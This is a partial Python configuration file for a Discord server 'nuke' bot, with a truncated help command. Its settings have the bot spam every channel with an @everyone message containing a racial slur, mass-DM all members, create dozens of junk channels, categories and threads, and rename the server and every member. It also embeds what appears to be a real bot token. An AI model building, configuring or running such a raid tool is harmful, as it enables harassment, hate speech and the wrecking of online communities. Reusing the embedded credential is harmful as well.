...
class Config:
    # ===== BOT SETTINGS =====
    TOKEN = "MTUwMjk1MTc3NzgyMDA4MjE5Ng.G28d4L._zPHZ-U5VhbGGpDuHyDgN9Kjn_zp4r90IdKx5c"  # Your bot token from Discord Developer Portal
    PREFIX = "."  # The prefix to use before commands (e.g. !nuke), you can also delete the prefix if you don't want one
    WHITELIST = [899973957036425217,1371534148589846578,888121176663142420]  # List of user IDs who can use the bot commands, don't give any ids if you want anyone to use bot.

    # ===== MESSAGE SETTINGS =====
    SPAM_MESSAGE = "♣♣♣♣ⓢⓘⓛⓛⓨⓒⓐⓣ✦✦✦✦✦✦@everyone [teamamtes make me wanna nuke this server ngers](https://files.catbox.moe/nu75tu.jpg)"# The message that will be spammed in channels
    SPAM_COUNT = 60  # How many times to send the spam message in each channel
    TEXT_TO_SPEECH = False  # If true, messages will be read aloud by Discord's text-to-speech
    DM_MESSAGE = "https://c.tenor.com/OEeXI6Ib1cQAAAAd/tenor.gif"  # Message sent to all members via direct message

    # ===== CHANNEL SETTINGS =====
    CHANNEL_NAME = "Ｇｏｎｅ ｂｙ ｓｃ＄"  # Base name for created text channels
    CHANNELS_COUNT = 80  # How many text channels to create
    NEW_CHANNEL_NAME = "Ｇｏｎｅ ｂｙ ｓｃ＄"  # Name pattern when renaming existing channels
    VOICE_CHANNELS_COUNT = 10  # How many voice channels to create
    VOICE_CHANNEL_NAME = "Ｇｏｎｅ ｂｙ ｓｃ＄"  # Base name for created voice channels
    CATEGORY_NAME = "Ｇｏｎｅ ｂｙ ｓｃ＄"  # Base name for created categories
    CATEGORIES_COUNT = 5  # How many categories to create
    THREAD_COUNT = 5  # How many threads to create in each text channel
    THREAD_NAME = "Ｇｏｎｅ ｂｙ ｓｃ＄"  # Base name for created threads
    NSFW_CHANNEL_NAME = "Ｇｏｎｅ ｂｙ ｓｃ＄"  # Base name for NSFW channels
    ...
    # ===== SERVER SETTINGS =====
    SERVER_NAME = "CHEVAL GRAND ON TOP"  # New name for the server
    SERVER_ICON_URL = "https://i.pinimg.com/736x/e9/a8/3d/e9a83d9cda455da57b007ff28cf84bf4.jpg"  # URL of new server icon
    NICKNAME = "LEAVE QUICKLY"  # New nickname for all members
    ...
    # ===== VOICE SETTINGS =====
    MOVE_VOICE_CHANNEL_NAME = "UFF UFF GET IN"  # Name of voice channel to moves everyone to
...
async def help(ctx):
    ...
    categories = {
        ...
        "\u200b": [
            "-# Thanks to Justin aka sillycat, This bot was possible since i got bored midway! 🎀"
        ]
    }
